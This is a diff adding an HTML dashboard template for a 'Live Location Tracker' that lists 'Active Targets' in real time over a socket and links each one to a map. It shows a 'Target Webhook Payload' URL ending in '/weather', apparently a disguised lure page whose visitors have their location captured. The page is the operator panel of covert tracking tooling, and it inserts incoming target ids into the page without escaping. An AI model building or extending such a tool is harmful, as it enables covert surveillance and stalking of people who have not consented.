@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Live Location Tracker</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-main: #0b0f19;
+            --bg-card: #151c2c;
+            --bg-card-hover: #1e293b;
+            --border-color: #2a364f;
+            --accent-blue: #3b82f6;
+            --accent-cyan: #06b6d4;
+            --accent-green: #10b981;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            min-height: 100vh;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            padding-bottom: 2rem;
+        }
+
+        /* Navbar / Header */
+        .navbar-custom {
+            background-color: var(--bg-card);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 2rem;
+        }
+
+        .brand-title {
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .pulse-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--accent-green);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--accent-green);
+            border-radius: 50%;
+            animation: pulse-animation 1.5s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        /* Container & Cards */
+        .main-wrapper {
+            max-width: 900px;
+            margin: 2rem auto;
+            padding: 0 1.25rem;
+        }
+
+        .info-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .target-card-container {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+        }
+
+        .search-bar {
+            background-color: var(--bg-main) !important;
+            border: 1px solid var(--border-color) !important;
+            color: var(--text-main) !important;
+            border-radius: 8px !important;
+        }
+
+        .search-bar::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Target Button Styles */
+        .target-item {
+            background-color: var(--bg-main);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0.9rem 1.2rem;
+            color: var(--text-main) !important;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            text-decoration: none;
+            transition: all 0.2s ease-in-out;
+            margin-bottom: 10px;
+        }
+
+        .target-item:hover {
+            background-color: var(--bg-card-hover);
+            border-color: var(--accent-blue);
+            transform: translateX(4px);
+        }
+
+        .target-id {
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.95rem;
+        }
+
+        .target-icon {
+            color: var(--accent-cyan);
+            background: rgba(6, 182, 212, 0.1);
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+        }
+
+        code {
+            background-color: rgba(59, 130, 246, 0.1);
+            color: var(--accent-blue);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 2.5rem 1rem;
+            color: var(--text-muted);
+        }
+
+        .footer-credit {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        .footer-credit a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .footer-credit a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Top Header -->
+    <header class="navbar-custom">
+        <div class="is-flex is-justify-content-space-between is-align-items-center">
+            <h1 class="brand-title title is-5 has-text-white mb-0">
+                <i class="fa-solid fa-radar has-text-link"></i> Live Location Tracker
+            </h1>
+            <div class="pulse-badge">
+                <span class="pulse-dot"></span> System Live
+            </div>
+        </div>
+    </header>
+
+    <main class="main-wrapper">
+        <!-- Target Payload Endpoint Info -->
+        <div class="info-box">
+            <div>
+                <span class="is-size-7 has-text-weight-bold is-uppercase has-text-grey-light">Target Webhook Payload:</span>
+                <div class="mt-1">
+                    <code>{{ global.remoteURL }}/weather</code>
+                </div>
+            </div>
+            <div class="footer-credit">
+                Created by <a href="http://codexanand.vercel.app/" target="_blank">Anand.</a>
+            </div>
+        </div>
+
+        <!-- Targets Section -->
+        <div class="target-card-container">
+            <div class="is-flex is-justify-content-space-between is-align-items-center mb-4 flex-wrap" style="gap: 10px;">
+                <h2 class="title is-5 has-text-white mb-0">
+                    <i class="fa-solid fa-crosshairs mr-2 has-text-info"></i>Active Targets
+                </h2>
+                <!-- Quick Filter / Search -->
+                <div class="control has-icons-left" style="min-width: 200px;">
+                    <input type="text" id="searchInput" class="input is-small search-bar" placeholder="Filter Target ID...">
+                    <span class="icon is-small is-left">
+                        <i class="fas fa-search has-text-grey"></i>
+                    </span>
+                </div>
+            </div>
+
+            <!-- Target List -->
+            <div id="tar-content">
+                {{ for(value, key in TARGETS) }}
+                <a href="/map?id={{ key }}" class="target-item" data-id="{{ key }}">
+                    <div class="target-id">
+                        <div class="target-icon">
+                            <i class="fa-solid fa-location-crosshairs"></i>
+                        </div>
+                        <span>{{ key }}</span>
+                    </div>
+                    <span class="has-text-grey-light is-size-7">
+                        View Map <i class="fa-solid fa-arrow-right ml-1"></i>
+                    </span>
+                </a>
+                {{/}}
+            </div>
+        </div>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const content = document.querySelector("#tar-content");
+        const searchInput = document.querySelector("#searchInput");
+
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        // Real-time target connection listener
+        socket.on("user-connected", newId => {
+            const a = document.createElement('a');
+            a.href = `/map?id=${newId}`;
+            a.className = "target-item";
+            a.setAttribute("data-id", newId);
+            a.innerHTML = `
+                <div class="target-id">
+                    <div class="target-icon">
+                        <i class="fa-solid fa-location-crosshairs"></i>
+                    </div>
+                    <span>${newId}</span>
+                </div>
+                <span class="has-text-grey-light is-size-7">
+                    View Map <i class="fa-solid fa-arrow-right ml-1"></i>
+                </span>
+            `;
+            content.appendChild(a);
+        });
+
+        // Target Filter functionality
+        searchInput.addEventListener("input", (e) => {
+            const filterValue = e.target.value.toLowerCase();
+            const items = content.querySelectorAll(".target-item");
+
+            items.forEach(item => {
+                const id = item.getAttribute("data-id").toLowerCase();
+                if (id.includes(filterValue)) {
+                    item.style.display = "flex";
+                } else {
+                    item.style.display = "none";
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
